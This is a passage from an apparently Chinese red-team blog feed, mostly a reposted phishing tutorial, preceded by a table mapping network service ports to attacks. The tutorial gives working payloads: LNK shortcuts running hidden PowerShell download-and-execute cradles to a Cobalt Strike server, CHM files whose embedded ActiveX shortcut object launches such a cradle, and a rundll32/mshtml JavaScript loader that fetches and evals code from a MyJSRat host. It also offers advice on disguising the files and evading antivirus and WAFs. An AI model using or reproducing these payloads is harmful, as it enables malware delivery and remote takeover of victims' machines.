<td>爆破</td>
</tr>
<tr>
<td>139</td>
<td>samba</td>
<td>爆破未授权访问远程代码执行</td>
</tr>
<tr>
<td>143</td>
<td>imap</td>
<td>爆破</td>
</tr>
<tr>
<td>161</td>
<td>snmp</td>
<td>爆破</td>
</tr>
<tr>
<td>389</td>
<td>ldap</td>
<td>注入攻击未授权访问</td>
</tr>
<tr>
<td>512&#x2F;513&#x2F;514</td>
<td>linux r</td>
<td>直接使用rlogin</td>
</tr>
<tr>
<td>873</td>
<td>rsync</td>
<td>未授权访问</td>
</tr>
<tr>
<td>1080</td>
<td>socket</td>
<td>爆破：进行内网渗透</td>
</tr>
<tr>
<td>1352</td>
<td>lotus</td>
<td>爆破：弱口令信息泄漏：源代码</td>
</tr>
<tr>
<td>1433</td>
<td>mssql</td>
<td>爆破：使用系统用户登录注入攻击</td>
</tr>
<tr>
<td>1521</td>
<td>oracle</td>
<td>爆破：TNS注入攻击</td>
</tr>
<tr>
<td>2049</td>
<td>nfs</td>
<td>配置不当</td>
</tr>
<tr>
<td>2181</td>
<td>zookeeper</td>
<td>未授权访问</td>
</tr>
<tr>
<td>3306</td>
<td>mysql</td>
<td>爆破拒绝服务注入</td>
</tr>
<tr>
<td>3389</td>
<td>rdp</td>
<td>爆破Shift后门</td>
</tr>
<tr>
<td>4848</td>
<td>glassfish</td>
<td>爆破：控制台弱口令认证绕过</td>
</tr>
<tr>
<td>5000</td>
<td>sybase&#x2F;DB2</td>
<td>爆破注入</td>
</tr>
<tr>
<td>5432</td>
<td>postgresql</td>
<td>缓冲区溢出注入攻击爆破：弱口令</td>
</tr>
<tr>
<td>5632</td>
<td>pcanywhere</td>
<td>拒绝服务代码执行</td>
</tr>
<tr>
<td>5900</td>
<td>vnc</td>
<td>爆破：弱口令认证绕过</td>
</tr>
<tr>
<td>6379</td>
<td>redis</td>
<td>未授权访问爆破：弱口令</td>
</tr>
<tr>
<td>7001</td>
<td>weblogic</td>
<td>Java反序列化控制台弱口令控制台部署webshell</td>
</tr>
<tr>
<td>80&#x2F;443&#x2F;8080</td>
<td>web</td>
<td>常见web攻击控制台爆破对应服务器版本漏洞</td>
</tr>
<tr>
<td>8069</td>
<td>zabbix</td>
<td>远程命令执行</td>
</tr>
<tr>
<td>9090</td>
<td>websphere控制台</td>
<td>爆破：控制台弱口令Java反序列</td>
</tr>
<tr>
<td>9200&#x2F;9300</td>
<td>elasticsearch</td>
<td>远程代码执行</td>
</tr>
<tr>
<td>11211</td>
<td>memcacache</td>
<td>未授权访问</td>
</tr>
<tr>
<td>27017</td>
<td>mongodb</td>
<td>爆破</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>RedTeam</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>红蓝对抗之钓鱼篇：常见钓鱼思路总结</title>
    <url>/posts/212af6cb.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/56emHdTpCZyRaGXv1LTIGA">https://mp.weixin.qq.com/s/56emHdTpCZyRaGXv1LTIGA</a></p>
</blockquote>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、文档连接钓鱼</span><br><span class="line">  1）LINK链接钓鱼</span><br><span class="line">  2）LINK快捷方式钓鱼</span><br><span class="line">  3）CHM文档钓鱼</span><br><span class="line">  CHM文档bypass waf</span><br><span class="line">  4）HTA钓鱼</span><br><span class="line">  5）宏钓鱼</span><br><span class="line">  宏钓鱼 bypass waf</span><br><span class="line">  6）OLE（Object Linking and Embedding，对象链接与嵌入）</span><br><span class="line">  7）嵌入JS元素</span><br><span class="line">  8）利用模板文件注入宏指令</span><br><span class="line">  9）CVE</span><br><span class="line">2、伪造界面钓鱼</span><br><span class="line">  1）PPT动作按钮特性构造 PPSX 钓鱼</span><br><span class="line">3、exe等可执行文件</span><br><span class="line">  1）shellcode 异或加密免杀（golang）</span><br><span class="line">  2）shellcode转换免杀</span><br><span class="line">  3）shellcode编译免杀</span><br><span class="line">  4）shellcode分离加载免杀</span><br><span class="line">  5）绕过沙盒</span><br><span class="line">  6）exe伪装</span><br><span class="line">  7）绕过行为检测</span><br><span class="line">  8）DLL劫持+重新制作安装包</span><br><span class="line">  9）免杀思路</span><br><span class="line">4、邮件钓鱼</span><br><span class="line">5、flash钓鱼</span><br><span class="line">6、网站钓鱼</span><br></pre></td></tr></table></figure>

<h2 id="1、文档连接钓鱼"><a href="#1、文档连接钓鱼" class="headerlink" title="1、文档连接钓鱼"></a>1、文档连接钓鱼</h2><h3 id="1）LINK链接钓鱼"><a href="#1）LINK链接钓鱼" class="headerlink" title="1）LINK链接钓鱼"></a>1）LINK链接钓鱼</h3><p>首先说明一点：ftp加! 可以执行命令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640.jpeg" alt="图片"></p>
<p>首先创建一个ftp的快捷方式，然后新建一个文件名 aaa.dll ，然后内容为cs的后门恶意链接（powershell上线命令）</p>
<p>快捷方式的起始位置留空，目标为：C:\Winodws\System32\ftp.exe -“”s:aaa.dll</p>
<p>快捷方式的图标以及名字可以进行适当的伪装</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005532.jpeg" alt="图片"></p>
<p>这里演示一下生成后门恶意链接</p>
<p>运行CS，根据图片点击：Scripted Wed Delivery(s)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005633.jpeg" alt="图片"></p>
<p>主机地址为CS服务器端地址，监听使用之前的监听就可以，然后执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005634.jpeg" alt="图片"></p>
<p>这里就创建好了一个 powershell 的回连恶意链接 复制即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005635.jpeg" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>但是如果直接第三方调用powershell加参的话会被360等拦截，所以要采用无参调用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005736.jpeg" alt="图片"></p>
<h3 id="2）LINK快捷方式钓鱼"><a href="#2）LINK快捷方式钓鱼" class="headerlink" title="2）LINK快捷方式钓鱼"></a>2）LINK快捷方式钓鱼</h3><p>此方式与上述方式类似</p>
<p>首先查找后门绝对路径，可以提权后门的有很多文件，这里以 powershell.exe 进行演示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005737.jpeg" alt="图片"></p>
<p>打开目录，找到路径为：</p>
<p>C:\Windows\System32\WindowsPowerShell\v1.0</p>
<p>生成后门恶意链接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005633.jpeg" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005634.jpeg" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005635.jpeg" alt="图片"></p>
<p>创建 lnk 创建方式</p>
<p>将powershell恶意代码放入进行修改，将代码最前端添加绝对路径</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005738.jpeg" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c &quot;IEX ((new- object net.webclient).downloadstring(&#x27;http://x.x.x.x:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>这里免杀的话，使用base64等等进行混淆</p>
<p>然后对该文件右键选择进行创建快捷方式，对快捷方式右键选择属性，在目标写入恶意回弹代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005739.jpeg" alt="图片"></p>
<p>可以对图标和名称进行适当的更改，之后就可以开始钓鱼了</p>
<h3 id="3）CHM文档钓鱼"><a href="#3）CHM文档钓鱼" class="headerlink" title="3）CHM文档钓鱼"></a>3）CHM文档钓鱼</h3><p>使用 EasyCHM 可以轻松的新建一个 chm 文件</p>
<p>EasyCHM、Cobalt Strike、MyJSRat 钓鱼流程：制作html -&gt; 制作chm文件 -&gt; 伪装 -&gt; 打开chm上线</p>
<p>首先创建个空文件夹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005840.jpeg" alt="图片"></p>
<p>创建html文件，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Mousejack replay&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&#x27;,calc.exe&#x27;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005841.jpeg" alt="图片"></p>
<p>注意：”,payload”，上面代码中为”,calc.exe”，此处，payload前面要加一个英文版的逗号，，否则打开chm文档时会出错</p>
<p>此处打开文档执行的calc，也就是计算器</p>
<p>Easy CHM制作CHM文档</p>
<p>新建工程</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005842.jpeg" alt="图片"></p>
<p>工程目录选择我们建立的test文件夹（html文件放在文件夹内）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005943.jpeg" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005944.jpeg" alt="图片"></p>
<p>点击编译 生成CHM</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005945.jpeg" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005946.jpeg" alt="图片"></p>
<p>双击打开查看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006047.jpeg" alt="图片"></p>
<p>弹出计算机</p>
<p>尝试使用 Cobalt Strike 木马 + CHM 上线</p>
<p>Cobalt Strike -&gt; 点击attacks -&gt; web Drive by -&gt; scriped web Delivery</p>
<p>上文有详细步骤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006048.jpeg" alt="图片"></p>
<p>设立好监听点击开始</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006049.jpeg" alt="图片"></p>
<p>然后将 calc.exe 替换为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Mousejack replay&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:80/test&#x27;))&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006050.jpeg" alt="图片"></p>
<p>注意：exe后面要再加一个英文版逗号，否则无法执行exe，再是注意生成出来的payload字符串的双引号跟单引号的冲突</p>
<p>再重新生成，查看是否上线</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006051.jpeg" alt="图片"></p>
<p>MyJSRat配合CHM进行上线</p>
<p>MyJSRat下载地址：<a href="https://github.com/Ridter/MyJSRat">https://github.com/Ridter/MyJSRat</a></p>
<p>python2运行下面的命令：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006052.jpeg" alt="图片"></p>
<p>此处使用交互模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 MyJSRat.py -i 192.168.27.180 -p 8080</span><br></pre></td></tr></table></figure>

<p>Kali Linux 运行访问</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006153.jpeg" alt="图片"></p>
<p>复制代码替换payload，记得加上逗号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Mousejack replay&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&#x27;,rundll32.exe, javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.27.180:8081/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;&#x27;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>然后重新生成CHM并且执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006154.jpeg" alt="图片"></p>
<p>在kali上可以进行命令交互</p>
<p><strong>CHM内容伪装</strong></p>
<p>先拿一个正常的CHM文档内容，转为html</p>
<p>通过hh命令，转为html</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hh -decompile .[\\html](file://html) CSS2.0中文手册.chm</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006155.jpeg" alt="图片"></p>
<p>钓鱼html嵌入到 html&#x2F;css2&#x2F;c_color.html</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006156.jpeg" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<p>工程目录选择css2</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006157.jpeg" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006258.jpeg" alt="图片"></p>
<p>注意此处，一定要诱导用户点击到 c_color.html 模块才可以</p>
<h3 id="CHM文档bypass-waf"><a href="#CHM文档bypass-waf" class="headerlink" title="CHM文档bypass waf"></a>CHM文档bypass waf</h3><p>（1）利用powershell无参运行，但是要把powershell脚本打包编译成chm，然后利用自带hh.exe 。hh.exe具有decompile(反编译，将chm返回成html，其实就类似chm可以比喻成一个压缩包，decompile是解压缩)的功能，可以将打包进chm的文件释放出来。</p>
<p>HH.EXE -decompile C:\Windows\Temp .&#x2F;XMLconvert.chm</p>
<p>（2） CHM本身支持js（jscript）语法，可以利用c#写个弹shell的，然后利用利用DotNetToJScript转js，然后在把js混淆加密进行打包免杀，利用cscript或者wscript来执行js。类似的还有执行hta文件等等。</p>
